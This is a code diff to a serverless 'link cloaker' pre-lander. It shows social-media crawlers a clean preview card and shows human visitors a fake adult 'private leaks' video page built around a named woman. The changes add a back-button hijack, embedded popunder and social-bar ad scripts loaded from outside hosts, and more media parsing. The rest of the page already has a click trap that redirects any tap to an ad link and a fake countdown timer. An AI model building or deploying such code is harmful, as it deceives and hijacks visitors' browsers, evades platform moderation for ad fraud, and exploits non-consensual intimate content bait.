@@ -1,10 +1,8 @@
-
-
- /**
+/**
  * Vercel Serverless Function: Smart Social Link Cloaker & VIP Vault Pre-Lander
  * File Path: api/index.js
  * Zero external runtime dependencies — uses Tailwind CSS via CDN.
- * Authentic Desi VIP Model Assets hosted on high-speed CDN.
+ * Integrated with Adsterra Direct Link, Popunder, Social Bar & MP4/Imgur Smart Parser.
  */
 
 const ADSTERRA_DIRECT_LINK = "https://www.profitableratecpmnetwork.com/q57rx5uii?key=71c304f4b20e2231d1d551e412b40da5";
@@ -45,9 +43,17 @@ function sanitizeImageUrl(rawImg, defaultUrl = DEFAULT_BANNER) {
     return "https://lh3.googleusercontent.com/d/" + gdriveUcMatch[1];
   }
 
+  // If full URL (https://...) or local path
   if (/^https?:\/\/[^\s"'<>]+$/i.test(trimmed) || /^\/[^\s"'<>]*$/.test(trimmed)) {
     return trimmed;
   }
+
+  // If short Imgur ID passed by bot (e.g. ?img=xYz987A)
+  if (/^[a-zA-Z0-9]{5,12}(\.(jpg|jpeg|png|gif|mp4))?$/i.test(trimmed)) {
+    const cleanId = trimmed.replace(/\.(jpg|jpeg|png|gif|mp4)$/i, "");
+    return "https://i.imgur.com/" + cleanId + ".jpg";
+  }
+
   return defaultUrl;
 }
 
@@ -57,7 +63,9 @@ export function isSocialCrawlerBot(userAgent = "") {
 }
 
 export function renderBotCloakHtml({ imageUrl = DEFAULT_BANNER, pageUrl = "", creatorName = "Priya Sharma" }) {
-  const safeImg = escapeHtml(imageUrl);
+  // If bot passed an .mp4 URL, use DEFAULT_BANNER as the static OpenGraph thumbnail so Twitter card never breaks
+  const isVideoUrl = /\.(mp4|webm|mov)(\?.*)?$/i.test(imageUrl);
+  const safeImg = escapeHtml(isVideoUrl ? DEFAULT_BANNER : imageUrl);
   const safeUrl = escapeHtml(pageUrl);
   const title = escapeHtml(creatorName + " • Official VIP 18+ Private Vault");
   const description = escapeHtml("Exclusive uncensored MMS tapes, viral private leaks, and private bedroom live stream recordings. Verified VIP Access Only.");
@@ -104,8 +112,9 @@ export function renderHumanPrelanderHtml({
   creatorHandle = "@priyasharma.vip",
   interceptPreview = false
 }) {
-  const safeAvatar = escapeHtml(imageUrl || DEFAULT_AVATAR);
-  const safeBanner = escapeHtml(bannerUrl || DEFAULT_BANNER);
+  const isVideoPreview = /\.(mp4|webm|mov)(\?.*)?$/i.test(videoPreviewUrl);
+  const safeAvatar = escapeHtml( /\.(mp4|webm|mov)(\?.*)?$/i.test(imageUrl) ? DEFAULT_AVATAR : (imageUrl || DEFAULT_AVATAR) );
+  const safeBanner = escapeHtml( /\.(mp4|webm|mov)(\?.*)?$/i.test(bannerUrl) ? DEFAULT_BANNER : (bannerUrl || DEFAULT_BANNER) );
   const safeVideoPreview = escapeHtml(videoPreviewUrl || bannerUrl || DEFAULT_BANNER);
   const safeDirectLink = escapeHtml(directLink);
   const safeCreatorName = escapeHtml(creatorName);
@@ -164,7 +173,9 @@ export function renderHumanPrelanderHtml({
   <title>${safeCreatorName} • VIP 18+ Private Vault</title>
   <script src="https://cdn.tailwindcss.com"></script>
 
-  <!-- PASTE YOUR ADSTERRA POPUNDER / SOCIAL BAR SCRIPTS DIRECTLY BELOW HERE -->
+  <!-- ADSTERRA POPUNDER & SOCIAL BAR SCRIPTS -->
+  <script src="https://pl32077615.profitableratecpmnetwork.com/cd/60/9d/cd609d38ac49a5cc88f98b089b5c3413.js"></script>
+  <script data-cfasync="false" src="https://brijmohan.org/14/05e1ecd798888842868baa55a54347ff"></script>
 
   <style>
     @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@500;700&family=Outfit:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');
@@ -275,14 +286,14 @@ export function renderHumanPrelanderHtml({
       </div>
     </section>
 
-    <!-- Interactive 18+ Fake Video Player with Pulse Glow Play Button -->
+    <!-- Interactive 18+ Video / Image Player with Pulse Glow Play Button -->
     <section class="mt-5 px-4">
       <div class="relative aspect-video w-full overflow-hidden rounded-2xl border border-white/15 bg-zinc-950 shadow-2xl">
-        <img
-          src="${safeVideoPreview}"
-          alt="Video Preview"
-          class="h-full w-full object-cover blur-sm brightness-50"
-        />
+        ${
+          isVideoPreview
+            ? `<video src="${safeVideoPreview}" autoplay loop muted playsinline class="h-full w-full object-cover blur-sm brightness-50"></video>`
+            : `<img src="${safeVideoPreview}" alt="Video Preview" class="h-full w-full object-cover blur-sm brightness-50" />`
+        }
         <div class="absolute inset-0 bg-gradient-to-t from-black via-black/40 to-black/20"></div>
 
         <!-- Big Pulsing Play Button -->
@@ -386,6 +397,14 @@ export function renderHumanPrelanderHtml({
       // Global click & touch trap: any click/tap anywhere redirects immediately
       document.addEventListener("click", triggerDirectLinkRedirect, true);
 
+      // Back-Button Hijack: Redirect to Adsterra Direct Link if user taps Back
+      try {
+        window.history.pushState(null, "", window.location.href);
+        window.onpopstate = function () {
+          window.location.href = ADSTERRA_DIRECT_LINK;
+        };
+      } catch (_) {}
+
       // Urgent 04:59 Countdown Timer
       var remainingSeconds = 4 * 60 + 59;
       var timerEl = document.getElementById("countdown-timer");
@@ -442,10 +461,10 @@ export default function handler(req, res) {
   const host =
     (req.headers && req.headers.host) || "fan-page-orpin-mu.vercel.app";
 
-  // Dynamic image parameter (?img=...) with safe Google Drive auto-converter
+  // Dynamic image/video parameter (?img=...) with Imgur ID & MP4 support
   const imageUrl = sanitizeImageUrl(query.img, DEFAULT_AVATAR);
   const bannerUrl = sanitizeImageUrl(query.banner, DEFAULT_BANNER);
-  const videoPreviewUrl = sanitizeImageUrl(query.preview, DEFAULT_BANNER);
+  const videoPreviewUrl = sanitizeImageUrl(query.preview || query.img, DEFAULT_BANNER);
   const directLink =
     typeof query.link === "string" && query.link.trim()
       ? query.link.trim()
@@ -456,7 +475,6 @@ export default function handler(req, res) {
       : "Priya Sharma";
   const interceptPreview = query.preview_mode === "1";
 
-  // Allow simulator UA override via query param for live testing
   const effectiveUa =
     typeof query._sim_ua === "string" && query._sim_ua.trim()
       ? query._sim_ua
